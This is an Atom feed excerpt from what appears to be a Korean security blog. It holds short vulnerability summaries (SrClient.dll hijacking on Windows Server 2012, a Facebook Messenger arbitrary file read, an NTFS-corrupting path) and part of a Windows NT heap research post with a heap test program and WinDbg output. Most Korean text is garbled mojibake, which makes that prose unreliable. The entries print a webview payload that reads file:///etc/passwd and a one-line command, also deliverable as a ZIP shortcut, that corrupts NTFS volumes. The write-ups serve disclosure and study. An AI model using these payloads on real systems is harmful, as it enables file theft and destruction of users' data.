      <tag>idioth</tag>
      
      <tag>vmware</tag>
      
      <tag>heap overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] SrClient DLL hijacking</title>
    <link href="/2021/03/03/fabu1ous/2021-03-03/"/>
    <url>/2021/03/03/fabu1ous/2021-03-03/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://blog.vonahi.io/srclient-dll-hijacking/">SrClient DLL Hijacking</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows Server 2012</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Windows Server 2012 R2ë¥¼ ì œì™¸í•œ ëª¨ë“  Windows Server 2012ì—ì„œ ì•…ìš©í•  ìˆ˜ ìˆëŠ” DLL hijackingì„ í†µí•œ ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. Windows Module Installer Serviceì˜ <code>TiWork.exe</code>ê°€ Windows search orderì— ì˜ê±°í•˜ì—¬ ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ë¦¬ì†ŒìŠ¤(<code>SrClient.dll</code>)ì˜ ë¡œë“œë¥¼ ì‹œë„í•©ë‹ˆë‹¤. <code>TiWork.exe</code>ëŠ” NT AUTHORITY\SYSTEM ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰ë˜ê¸° ë•Œë¬¸ì— <code>SrClient.dll</code>ì„ hijacking í•˜ëŠ” ê²ƒìœ¼ë¡œ ê¶Œí•œ ìƒìŠ¹ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>í”„ë¡œì„¸ìŠ¤ê°€ ë¡œë“œí•˜ê³ ì í•˜ëŠ” DLLì˜ ì ˆëŒ€ ì£¼ì†Œ í˜¹ì€ ì •í™•í•œ ì£¼ì†Œë¥¼ ì§€ì •í•˜ì§€ ì•Šìœ¼ë©´ WindowsëŠ” DLL search orderì— ë”°ë¼ í•´ë‹¹ DLL ìœ„ì¹˜ë¥¼ ê²€ìƒ‰í•©ë‹ˆë‹¤.</p><ol><li>í”„ë¡œì„¸ìŠ¤ê°€ ì§€ì •í•œ ì£¼ì†Œ</li><li>System ë””ë ‰í„°ë¦¬ (<code>system32</code>, <code>systemWOW64</code>)</li><li>Windows ë””ë ‰í„°ë¦¬ (<code>C:\Windows\</code>)</li><li>í˜„ì¬ ë””ë ‰í„°ë¦¬</li><li><code>%PATH%</code>í™˜ê²½ ë³€ìˆ˜ì— ë“±ë¡ëœ ë””ë ‰í„°ë¦¬</li></ol><p>Third-party Appì— ì˜í•´ ë¶€ì ì ˆí•œ ì ‘ê·¼ ê¶Œí•œì´ ì„¤ì •ëœ ë””ë ‰í„°ë¦¬ê°€ <code>%PATH%</code> í™˜ê²½ ë³€ìˆ˜ ê°’ìœ¼ë¡œ ë“±ë¡ë˜ì–´ ìˆë‹¤ë©´ <code>SrClient.dll</code>ë¥¼ hijacking í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. Windowsì˜ ì—…ë°ì´íŠ¸ ì²´í¬ë¥¼ í†µí•´  <code>TiWork.exe</code>ì˜ ì‹¤í–‰ì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆê³  ìœ ì € ê¶Œí•œì—ì„œ System ê¶Œí•œìœ¼ë¡œ ìƒìŠ¹í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>eop</tag>
      
      <tag>dll hijacking</tag>
      
      <tag>windows server</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Facebook Messenger ë°ìŠ¤í¬í†± ì•±ì˜ ì„ì˜ íŒŒì¼ ì½ê¸° ì·¨ì•½ì </title>
    <link href="/2021/03/02/l0ch/2021-03-02/"/>
    <url>/2021/03/02/l0ch/2021-03-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d">Facebook Messenger Desktop App Arbitrary File Read</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Facebook Messenger for Desktop</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>í˜ì´ìŠ¤ë¶ ë©”ì‹ ì €ì˜ ë°ìŠ¤í¬í†± ë²„ì „ ì•±ì—ì„œ arbitrary file read ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>í˜ì´ìŠ¤ë¶ ë©”ì‹ ì €ëŠ” Electronì„ ì‚¬ìš©í•˜ë©° <code>webviewTag</code> ê°€ í™œì„±í™”ë˜ì–´ìˆìŠµë‹ˆë‹¤. <code>webview</code> íƒœê·¸ëŠ” ë¡œì»¬ íŒŒì¼ì„ ë¡œë“œí•˜ëŠ” ê¸°ëŠ¥ì´ ì¡´ì¬í•´ í•´ì»¤ê°€ <code>&lt;webview src=&quot;file:[file location]&quot;&gt;&lt;/webview&gt;</code> ë‚´ìš©ì´ í¬í•¨ëœ ë§í¬ë¥¼ ì „ì†¡í•˜ë©´ íƒ€ê¹ƒì˜ ì„ì˜ì˜ ë¡œì»¬ íŒŒì¼ì„ ì½ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì„ í†µí•´ <code>/etc/passwd</code> íŒŒì¼ì„ ì½ëŠ” ê³¼ì •ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>í•´ì»¤ê°€ ì„ì˜ì˜ íƒ€ê¹ƒì—ê²Œ <code>webview</code> ê°€ í¬í•¨ëœ ì•…ì„± ë§í¬ë¥¼ ë³´ëƒ…ë‹ˆë‹¤.</li><li>íƒ€ê¹ƒì€ ìŠ¤íŒ¸ ì„¹ì…˜ì„ ì—´ê³  ë§í¬ë¥¼ í´ë¦­í•©ë‹ˆë‹¤.</li><li>Facebook MessengerëŠ” ì•…ì„± ë§í¬ì— í¬í•¨ëœ <code>&lt;webview&gt; src=&quot;file:///etc/passwd&quot;&gt;&lt;/webview&gt;</code> ë¥¼ ì‚¬ìš©í•˜ì—¬ <code>/etc/passwd</code> íŒŒì¼ì„ ë¡œë“œí•©ë‹ˆë‹¤.</li><li><code>webview.executeJavaScript()</code>ë¡œ ë¡œë“œí•œ íŒŒì¼ì˜ ë°ì´í„°ë¥¼ ì½ì–´ì˜µë‹ˆë‹¤.</li></ol><p>Facebookì€ í•´ë‹¹ ì·¨ì•½ì  ë³´ê³ ì„œì— 2000$ì˜ ë³´ìƒì„ ì§€ê¸‰í–ˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>facebook</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary file read</tag>
      
      <tag>electron</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Microsoft fixes Windows 10 drive corruption bug</title>
    <link href="/2021/03/01/idioth/2021-03-01/"/>
    <url>/2021/03/01/idioth/2021-03-01/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.bleepingcomputer.com/news/microsoft/microsoft-fixes-windows-10-drive-corruption-bug-what-you-need-to-know/">Microsoft fixes Windows 10 drive corruption bug â€” what you need to know</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows XP</li><li>Windows 10</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><blockquote><p>ì•„ì§ ë©”ì¸ ì—…ë°ì´íŠ¸ì— íŒ¨ì¹˜ë˜ì§€ ì•Šì€ ë²„ê·¸ì…ë‹ˆë‹¤.</p></blockquote><p>Microsoftì—ì„œ íŠ¹ì • ê²½ë¡œì— ì ‘ê·¼í•˜ê±°ë‚˜ ì¡°ì‘ëœ íŒŒì¼ì„ ë³´ëŠ” ê²ƒë§Œìœ¼ë¡œ NTFS ë³¼ë¥¨ì´ ì†ìƒë  ìˆ˜ ìˆëŠ” Windows 10 ë²„ê·¸ë¥¼ ìˆ˜ì •í–ˆìŠµë‹ˆë‹¤.</p><p>í•´ë‹¹ ë²„ê·¸ëŠ” ë‚®ì€ ê¶Œí•œì—ì„œë„ í•œ ì¤„ì˜ ëª…ë ¹ì–´(<code>cd c:\\$i30:bitmap</code>)ë§Œìœ¼ë¡œ íŠ¸ë¦¬ê±° ë©ë‹ˆë‹¤. ëª…ë ¹ í”„ë¡¬í”„íŠ¸ì—ì„œ í•´ë‹¹ ëª…ë ¹ì„ ì‹¤í–‰í•˜ë©´ â€œíŒŒì¼ ë˜ëŠ” ë””ë ‰í„°ë¦¬ê°€ ì†ìƒë˜ì–´ ì½ì„ ìˆ˜ ì—†ìŠµë‹ˆë‹¤.â€ ì˜¤ë¥˜ ë©”ì‹œì§€ê°€ ì¶œë ¥ëœ í›„ PCë¥¼ ì¬ì‹œì‘í•˜ì—¬ ì†ìƒëœ ë””ìŠ¤í¬ ë³¼ë¥¨ì„ ë³µêµ¬í•˜ë¼ëŠ” ì•ŒëŒì´ í‘œì‹œë©ë‹ˆë‹¤.</p><p><code>$i30</code> NTFS ì¸ë±ìŠ¤ ì—”íŠ¸ë¦¬ë¡œ ë””ë ‰í„°ë¦¬ íŒŒì¼ ë° í•˜ìœ„ í´ë” ëª©ë¡ì„ í¬í•¨í•˜ëŠ” ë””ë ‰í„°ë¦¬ì™€ ê´€ë ¨ëœ NTFS ì†ì„±ì…ë‹ˆë‹¤. ì´ ì†ì„±ì— ì ‘ê·¼í•  ë•Œ ë“œë¼ì´ë¸Œê°€ ì†ìƒë˜ëŠ” ì´ìœ ëŠ” ë¸”ë£¨ìŠ¤í¬ë¦°ì— ëŒ€í•œ ë ˆì§€ìŠ¤íŠ¸ë¦¬ í‚¤ê°€ ì‘ë™í•˜ì§€ ì•Šì•„ ì •í™•í•˜ê²Œ ì•Œ ìˆ˜ ì—†ìŠµë‹ˆë‹¤.</p><p>ë˜í•œ ëª…ë ¹ì–´ë¥¼ ì…ë ¥í•˜ëŠ” ê²ƒë¿ë§Œ ì•„ë‹ˆë¼ ë°”ë¡œê°€ê¸° ê²½ë¡œê°€ <code>C:\\$i30:bitmap</code>ì¸ íŒŒì¼ì„ ë³´ëŠ” ê²ƒë§Œìœ¼ë¡œë„ í•´ë‹¹ ë²„ê·¸ê°€ ë°œìƒí•˜ì—¬ NTFS ë³¼ë¥¨ì´ ì†ìƒë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ZIP íŒŒì¼ ë‚´ë¶€ì— <code>C:\\$i30:bitmap</code> ë°”ë¡œê°€ê¸°ê°€ ì¡´ì¬í•˜ëŠ” ì••ì¶• íŒŒì¼ì„ í†µí•´ ë²„ê·¸ë¥¼ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>MicrosoftëŠ” Windows Insider ë¹Œë“œ 21322 ë¦´ë¦¬ìŠ¤ì™€ í•¨ê»˜ í•´ë‹¹ ê²½ë¡œì— ì ‘ê·¼í•˜ë ¤ê³  í•˜ë©´ â€œì§€ì •ëœ ê²½ë¡œë¥¼ ì°¾ì„ ìˆ˜ ì—†ìŠµë‹ˆë‹¤.â€ë¥¼ ì¶œë ¥í•˜ê²Œ ìˆ˜ì •í•˜ì˜€ìŠµë‹ˆë‹¤.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.bleepingcomputer.com/news/security/windows-10-bug-corrupts-your-hard-drive-on-seeing-this-files-icon/">https://www.bleepingcomputer.com/news/security/windows-10-bug-corrupts-your-hard-drive-on-seeing-this-files-icon/</a></p><p><a href="https://www.sans.org/blog/ntfs-i30-index-attributes-evidence-of-deleted-and-overwritten-files/">https://www.sans.org/blog/ntfs-i30-index-attributes-evidence-of-deleted-and-overwritten-files/</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>idioth</tag>
      
      <tag>ntfs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Pwní•˜ê³  Coolí•˜ê³  Sexyí•œ Windows íƒë°©ê¸° Part 2 - NT Heap</title>
    <link href="/2021/02/28/l0ch/pwncoolsexy-part2/"/>
    <url>/2021/02/28/l0ch/pwncoolsexy-part2/</url>
    
    <content type="html"><![CDATA[<p>ì•ˆë…•í•˜ì„¸ìš”! L0chì…ë‹ˆë‹¤. ì˜¤ëŠ˜ì€ ì´ì „ ê¸€ì—ì„œ ì˜ˆê³ í•œ ëŒ€ë¡œ NT heapì˜ Low Fragmentation Heapì— ëŒ€í•´ ì“°ë ¤ê³  í–ˆì§€ë§Œ..  Windows Heapì— ëŒ€í•œ ì „ë°˜ì ì¸ ì •ë¦¬ì™€ ê°™ì´ ì“°ëŠ” ê²ƒì´ ì¢‹ì„ ê²ƒ ê°™ì•„ Windows Heapìœ¼ë¡œ ì£¼ì œë¥¼ í™•ì¥í•´ë´¤ìŠµë‹ˆë‹¤. ê·¸ë˜ì„œ! ì˜¤ëŠ˜ì€ WIndowsê°€ Heapì„ ì–´ë–»ê²Œ ê´€ë¦¬í•˜ëŠ”ì§€ í•˜ë‚˜ì”© ëœ¯ì–´ë³´ë©´ì„œ ì‚´í´ë³´ë„ë¡ í• ê²Œìš”!</p><h1 id="Windows-Heap"><a href="#Windows-Heap" class="headerlink" title="Windows Heap"></a>Windows Heap</h1><p>ìœˆë„ìš°ì˜ Heap í• ë‹¹ ë©”ì»¤ë‹ˆì¦˜ì€ NT Heapê³¼ Windows 10ì—ì„œ ì¶”ê°€ëœ Segment Heap ë‘ ê°€ì§€ê°€ ì¡´ì¬í•©ë‹ˆë‹¤. NT Heapì€ Windowsì˜ ê¸°ë³¸ memory allocatorì´ë©° Segment Heapì€ ìµœê·¼ì— ë„ì…ëœ ë§Œí¼ ë” íš¨ìœ¨ì ì¸ memory allocatorì…ë‹ˆë‹¤.</p><p>ì—¬ë‹´ìœ¼ë¡œ Segment Heapì€ ë„ì… ì´ˆê¸°ì—ëŠ” ì¼ë¶€ ì‹œìŠ¤í…œ í”„ë¡œì„¸ìŠ¤, MS ì—£ì§€ ë¸Œë¼ìš°ì €, UWP(Universal Windows Platform) ì•± ë“±ì—ì„œë§Œ ì‚¬ìš©í•˜ê³  ìˆì—ˆìœ¼ë‚˜ 2020ë…„ 5ì›” ì—…ë°ì´íŠ¸ (ë²„ì „ 2004, ë¹Œë“œ 19041)ë¡œ ì¼ë°˜ì ì¸ Win32 ì–´í”Œë¦¬ì¼€ì´ì…˜ë„ ì‚¬ìš©í•  ìˆ˜ ìˆê²Œ ë˜ì—ˆë‹¤ê³  í•©ë‹ˆë‹¤.. ë§Œ ì•„ì§ì€ ì¼ë°˜ì ì¸ ì–´í”Œë¦¬ì¼€ì´ì…˜ì—ì„œëŠ” NT Heapì„ ì‚¬ìš©í•˜ëŠ” ì¶”ì„¸ì£ . ë©”ëª¨ë¦¬ ì¡ì•„ë¨¹ëŠ” í•˜ë§ˆ í¬ë¡¬ë„ Segment Heapì„ ì ìš©í•œ íŒ¨ì¹˜ ì´í›„ ë©”ëª¨ë¦¬ ì‚¬ìš©ëŸ‰ì€ ì¤„ì˜€ì§€ë§Œ ì„±ëŠ¥ ì €í•˜ë„ ê°™ì´ ë‚˜íƒ€ë‚˜ì„œ ë‹¤ì‹œ ë¹„í™œì„±í™”í–ˆë‹¤ê³  í•˜ë„¤ìš”..ã…‹ã…‹</p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%201.png"></p><p>Segment Heapì— ëŒ€í•´ì„œëŠ” ë‹¤ìŒì— ë‹¤ë¤„ë³´ë„ë¡ í•˜ê³ , ì´ë²ˆ ê¸€ì—ì„œëŠ” NT Heapì— ëŒ€í•´ ì •ë¦¬í•´ë³´ê² ìŠµë‹ˆë‹¤. </p><h1 id="NT-Heap"><a href="#NT-Heap" class="headerlink" title="NT Heap"></a>NT Heap</h1><p>NT Heapì— ëŒ€í•œ Overviewë¶€í„° ì§šê³  ë„˜ì–´ê°€ ë³¼ê¹Œìš”?</p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%202.png"></p><p>ìœ„ ì‚¬ì§„ì€ ì¼ë°˜ì ì¸ <code>malloc()</code>ê³¼ <code>free()</code>ë¥¼ ì‚¬ìš©í•´ Heapì„ í• ë‹¹í•  ë•Œì˜ ë‚´ë¶€ í• ë‹¹ í”„ë¡œì„¸ìŠ¤ì…ë‹ˆë‹¤. </p><p>NT Heapì€ í¬ê²Œ Front-Endì™€ Back-Endë¡œ ë‚˜ëˆ ì§€ë©° Front-Endê°€ ì´í›„ì— ì„¤ëª…í•  Low Fragmentation Heap(LFH)ì„ ì˜ë¯¸í•©ë‹ˆë‹¤. LFHê°€ ë¹„í™œì„±í™”ë˜ì–´ ìˆë‹¤ë©´ Heap ë©”ëª¨ë¦¬ í• ë‹¹ ì‹œ Front-Endë¥¼ ê±´ë„ˆë›°ê³  ë°”ë¡œ Back-Endë¡œ ë„˜ì–´ê°‘ë‹ˆë‹¤.</p><h1 id="Low-Fragmentation-Heap"><a href="#Low-Fragmentation-Heap" class="headerlink" title="Low Fragmentation Heap"></a>Low Fragmentation Heap</h1><p>Heap Fragmentation(ë‹¨í¸í™”)ì€ ë°˜ë³µë˜ëŠ” í• ë‹¹ê³¼ í•´ì œ ì´í›„ ê°€ìš© ë©”ëª¨ë¦¬ê°€ ì‘ê³  ë¶ˆì—°ì†ì ìœ¼ë¡œ ë‚˜ë‰œ ìƒíƒœë¥¼ ë§í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ë‹¨í¸í™”ê°€ ë°œìƒí•˜ë©´ ê°€ìš© ë©”ëª¨ë¦¬ë³´ë‹¤ ì‘ì€ í¬ê¸°ì— ëŒ€í•´ í• ë‹¹ì„ ìš”ì²­í•´ë„ ì—°ì†ì ì¸ ë©”ëª¨ë¦¬ êµ¬ê°„ í™•ë³´ê°€ ë˜ì§€ ì•Šì•„ ë©”ëª¨ë¦¬ í• ë‹¹ ìš”ì²­ì´ ì‹¤íŒ¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%203.png"></p><blockquote><p>ë‹¨í¸í™”ë¡œ ì¸í•´ ê°€ìš© ë©”ëª¨ë¦¬ê°€ ì¶©ë¶„í•œë°ë„ í• ë‹¹ì´ ì‹¤íŒ¨í•  ìˆ˜ ìˆë‹¤.</p></blockquote><p>ì´ˆê¸° ìœˆë„ìš°ì—ì„œë„ ì´ëŸ° ë‹¨í¸í™” ì´ìŠˆê°€ ì¡´ì¬í–ˆìœ¼ë©° MSëŠ” ì´ëŸ° ë‹¨í¸í™” ì´ìŠˆë¥¼ í•´ê²°í•˜ê¸° ìœ„í•´ LFHë¥¼ ë„ì…í–ˆê³  vistaë¶€í„° ì‹œìŠ¤í…œì—ì„œ ìë™ìœ¼ë¡œ ì„¤ì •ë˜ë©´ì„œ ë³¸ê²©ì ìœ¼ë¡œ ì‚¬ìš©ë˜ê¸° ì‹œì‘í–ˆìŠµë‹ˆë‹¤.</p><p>LFHëŠ” ë™ì¼í•œ í¬ê¸°ì˜ Heap ë©”ëª¨ë¦¬ë¥¼ ì—¬ëŸ¬ ë²ˆ í• ë‹¹í•˜ë‹¤ ë³´ë©´ ìë™ìœ¼ë¡œ í™œì„±í™”ë©ë‹ˆë‹¤. ê°„ë‹¨í•œ í…ŒìŠ¤íŠ¸ ì½”ë“œë¡œ ì–´ëŠ ì‹œì ì—ì„œ LFHê°€ í™œì„±í™”ë˜ëŠ”ì§€ ë³¼ê¹Œìš”?</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CHUNK_SIZE 0x300</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-keyword">int</span> i;    LPVOID chunk;    HANDLE defaultHeap = GetProcessHeap();    <span class="hljs-keyword">int</span> prev_chunk = <span class="hljs-number">0</span>;    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">30</span>; i++) &#123;        chunk = HeapAlloc(defaultHeap, <span class="hljs-number">0</span>, CHUNK_SIZE);        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] Chunk 0x%p   &quot;</span>, i, chunk);        <span class="hljs-keyword">if</span> (i != <span class="hljs-number">0</span>)            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;offset : %d\n&quot;</span>, (<span class="hljs-keyword">int</span>)chunk - prev_chunk);        <span class="hljs-keyword">else</span>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);        prev_chunk = (<span class="hljs-keyword">int</span>)chunk;    &#125;    system(<span class="hljs-string">&quot;PAUSE&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p><img src="Untitled 4.png" height="550px" width="500px" ></p><p>ë™ì¼í•œ í¬ê¸°ì˜ Heapì„ ì—°ì†ì ìœ¼ë¡œ í• ë‹¹í–ˆì„ ë•Œì˜ ê²°ê³¼ì…ë‹ˆë‹¤. </p><ul><li>ì¸ë±ìŠ¤ 0ê³¼ 1ì„ ì œì™¸í•œ ì¸ë±ìŠ¤ 16ê¹Œì§€ì˜ chunk ì‚¬ì´ ê±°ë¦¬ê°€ ì¼ì •í•¨</li><li>ì¸ë±ìŠ¤ 17ë¶€í„° chunk ê°„ ê±°ë¦¬ê°€ ì¼ì •í•˜ì§€ ì•ŠìŒ</li></ul><p>ë©”ëª¨ë¦¬ ìƒí™©ì— ë”°ë¼ ì¡°ê¸ˆì”©ì˜ ì°¨ì´ëŠ” ìˆì§€ë§Œ ëŒ€ë¶€ë¶„ ì´ëŸ¬í•œ íŠ¹ì„±ì„ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤.</p><p>chunkê°€ LFHì— ì˜í•´ ê´€ë¦¬ë˜ê³  ìˆëŠ”ì§€ëŠ” Windbgì—ì„œ ë‹¤ìŒ ëª…ë ¹ì–´ë¡œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs bash">!hepa -x [Chunk Address]</code></pre><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%205.png"></p><p>ìœ„ ì‚¬ì§„ì—ì„œ ì¸ë±ìŠ¤ 0 ~ 16 ì‚¬ì´ ì¼ì •í•œ ê±°ë¦¬ë¡œ í• ë‹¹ë˜ëŠ” chunkë“¤ì€ LFHë¡œ ê´€ë¦¬ë˜ì§€ ì•Šê³ , ì¸ë±ìŠ¤ 17ë¶€í„° ë¬´ì‘ìœ„ì˜ ê±°ë¦¬ë¥¼ ê°–ëŠ” chunkëŠ” LFHë¡œ ê´€ë¦¬ë˜ê³  ìˆìŒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><p>ì—¬ê¸°ì„œ LFHì˜ íŠ¹ì§• í•œ ê°€ì§€ë¥¼ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤!</p><blockquote><p>LFHê°€ í™œì„±í™”ë˜ë©´ Heap Chunk ê°„ ê±°ë¦¬ê°€ ë¬´ì‘ìœ„ë¡œ í• ë‹¹ëœë‹¤.</p></blockquote><p>ì´ëŠ” Windowsì—ì„œ Exploitì„ ì§„í–‰í•  ë•Œ Heapì„ ì›í•˜ëŠ” ëŒ€ë¡œ ì„¸íŒ…í•˜ëŠ” Heap Groomingì„ ë” ì–´ë µê²Œ ë§Œë“¤ì–´ reliable í•œ exploit ì œì‘ì„ ì–´ë µê²Œ í•©ë‹ˆë‹¤. </p><ul><li>16KB(0x4000) ë³´ë‹¤ í° Heapì„ í• ë‹¹í•  ê²½ìš°ì—ëŠ” LFHê°€ ê´€ë¦¬í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.</li></ul><h1 id="NT-Heap-Analysis"><a href="#NT-Heap-Analysis" class="headerlink" title="NT Heap Analysis"></a>NT Heap Analysis</h1><p>ì´ì œ NT Heapì„ ë³¸ê²©ì ìœ¼ë¡œ ë¶„ì„í•´ë³´ê² ìŠµë‹ˆë‹¤! ìš°ì„  Heap ê´€ë¦¬ì— ì‚¬ìš©ë˜ëŠ” êµ¬ì¡°ì²´ì™€ ì—­í• ì— ëŒ€í•´ ì •ë¦¬í•˜ê² ìŠµë‹ˆë‹¤.</p><h2 id="HEAP"><a href="#HEAP" class="headerlink" title="_HEAP"></a>_HEAP</h2><p>memory allocatorì˜ í•µì‹¬ êµ¬ì¡°ì²´ë¡œ, ì „ì²´ Heapì„ ê´€ë¦¬í•  ë•Œ ì“°ì…ë‹ˆë‹¤. êµ³ì´ ë¶„ë¥˜í•˜ìë©´ NT Heapë³´ë‹¤ ìƒìœ„ì˜ êµ¬ì¡°ì²´ë¡œ í”„ë¡œì„¸ìŠ¤ì— í• ë‹¹ëœ Heapì˜ ì‹œì‘ì— ìœ„ì¹˜í•˜ëŠ” êµ¬ì¡°ì²´ì…ë‹ˆë‹¤.</p><p>ë™ì¼í•œ í…ŒìŠ¤íŠ¸ ì½”ë“œë¥¼ ì‹¤í–‰í•œ ë’¤ Windbgì—ì„œ ì§ì ‘ í™•ì¸í•´ë³¼ê²Œìš”. </p><p><img src="Untitled 6.png" height="560px" width="500px" ></p><p>í”„ë¡œì„¸ìŠ¤ì˜ Heap ListëŠ” PEBì˜ <code>ProcessHeaps</code> í•„ë“œì— ìœ„ì¹˜í•©ë‹ˆë‹¤. <code>dt _PEB @$peb</code> ëª…ë ¹ì–´ë¡œ ëª¨ë“  PEB í•„ë“œ ê°’ì„ ì¶œë ¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><pre><code class="hljs text">0:001&gt; dt _PEB @$pebntdll!_PEB   +0x000 InheritedAddressSpace : 0 &#x27;&#x27;   +0x001 ReadImageFileExecOptions : 0 &#x27;&#x27;   +0x002 BeingDebugged    : 0x1 &#x27;&#x27;   +0x003 BitField         : 0x4 &#x27;&#x27;   +0x003 ImageUsesLargePages : 0y0   +0x003 IsProtectedProcess : 0y0   +0x003 IsImageDynamicallyRelocated : 0y1   +0x003 SkipPatchingUser32Forwarders : 0y0   +0x003 IsPackagedProcess : 0y0   +0x003 IsAppContainer   : 0y0   +0x003 IsProtectedProcessLight : 0y0   +0x003 IsLongPathAwareProcess : 0y0   +0x004 Padding0         : [4]  &quot;&quot;   +0x008 Mutant           : 0xffffffff`ffffffff Void   +0x010 ImageBaseAddress : 0x00007ff6`c6c30000 Void   +0x018 Ldr              : 0x00007ff9`905b94c0 _PEB_LDR_DATA   +0x020 ProcessParameters : 0x000001cd`c8f922e0 _RTL_USER_PROCESS_PARAMETERS   +0x028 SubSystemData    : (null)    +0x030 ProcessHeap      : 0x000001cd`c8f90000 Void...</code></pre><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%207.png"></p><p>ë„ˆë¬´ ë§ìœ¼ë‹ˆ ìš°ë¦¬ê°€ ì°¾ìœ¼ë ¤ëŠ” í•„ë“œëª…ìœ¼ë¡œ ê²€ìƒ‰í•´ë³´ì£ </p><pre><code class="hljs c">?? ((_PEB*) @$peb)-&gt;ProcessHeaps <span class="hljs-comment">// PEB-&gt;ProcessHeaps í•„ë“œê°’ ì¶œë ¥</span></code></pre><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%208.png"></p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%209.png"></p><p><code>ProcessHeaps</code> ëŠ” <code>_Heap</code> êµ¬ì¡°ì²´ë¥¼ ê°€ë¦¬í‚¤ëŠ” í¬ì¸í„° ë°°ì—´ì„ ê°€ë¦¬í‚µë‹ˆë‹¤. í¬ì¸í„° ë°°ì—´ì—ëŠ” Heap ì£¼ì†Œë“¤ì´ ë‚˜ì—´ë˜ì–´ ìˆë„¤ìš”. </p><p>ì²« ë²ˆì§¸ êµ¬ì¡°ì²´ë¥¼ í™•ì¸í•´ë³¼ê²Œìš”. <code>_HEAP</code> ì€  <code>dt _HEAP [Address]</code> ë¡œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs text">0:001&gt; dt _HEAP 000001cd`c8f90000ntdll!_HEAP   +0x000 Segment          : _HEAP_SEGMENT   +0x000 Entry            : _HEAP_ENTRY   +0x010 SegmentSignature : 0xffeeffee   +0x014 SegmentFlags     : 2   +0x018 SegmentListEntry : _LIST_ENTRY [ 0x000001cd`c8f90120 - 0x000001cd`c8f90120 ]...   +0x07c EncodeFlagMask   : 0x100000   +0x080 Encoding         : _HEAP_ENTRY   +0x090 Interceptor      : 0...   +0x138 BlocksIndex      : 0x000001cd`c8f902e8 Void   